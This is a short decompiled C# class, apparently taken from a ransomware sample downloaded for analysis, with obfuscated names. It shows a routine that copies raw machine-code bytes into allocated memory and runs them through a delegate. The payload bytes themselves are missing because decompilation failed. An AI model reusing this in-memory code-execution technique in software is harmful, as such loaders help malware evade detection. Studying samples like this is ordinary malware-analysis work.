// Decompiled with JetBrains decompiler
// Type: 3B4674EB
// Assembly: JustSvK was here ;D, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 17F13239-28E0-4F33-9D80-95AE56A139B0
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan-Ransom.MSIL.Blocker.gen-16c7811696471900b3a83f0b8949a6f14fe1aaf67c424d9ceeedce51dc3016fe.exe

using System;
using System.Runtime.InteropServices;

public static class \u0033B4674EB
{
  private static readonly byte[] \u003096507EC;
  private static readonly byte[] \u003126D6CDC;

  public static int[] \u0036AB410E0(int _param0)
  {
    IntPtr num = IntPtr.Zero;
    try
    {
      byte[] source = IntPtr.Size == 4 ? \u0033B4674EB.\u003096507EC : \u0033B4674EB.\u003126D6CDC;
      num = \u00333001625.\u003302953E7(IntPtr.Zero, new UIntPtr((uint) source.Length), \u00333001625.\u00345CB20BD.\u0032819199E | \u00333001625.\u00345CB20BD.\u0033ED042A8, \u00333001625.\u0037AC46DB6.\u00376F330CA);
      Marshal.Copy(source, 0, num, source.Length);
      \u0033B4674EB.\u00335315301 forFunctionPointer = (\u0033B4674EB.\u00335315301) Marshal.GetDelegateForFunctionPointer(num, typeof (\u0033B4674EB.\u00335315301));
      GCHandle gcHandle = new GCHandle();
      int[] numArray = new int[4];
      try
      {
        gcHandle = GCHandle.Alloc((object) numArray, GCHandleType.Pinned);
        forFunctionPointer(_param0, numArray);
      }
      finally
      {
        if (gcHandle != new GCHandle())
          gcHandle.Free();
      }
      return numArray;
    }
    finally
    {
      if (num != IntPtr.Zero)
        \u00333001625.\u003030D5D31(num, 0U, 32768U);
    }
  }

  static \u0033B4674EB()
  {
    // ISSUE: unable to decompile the method.
  }

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  private delegate void \u00335315301(int _param1, int[] _param2);
}
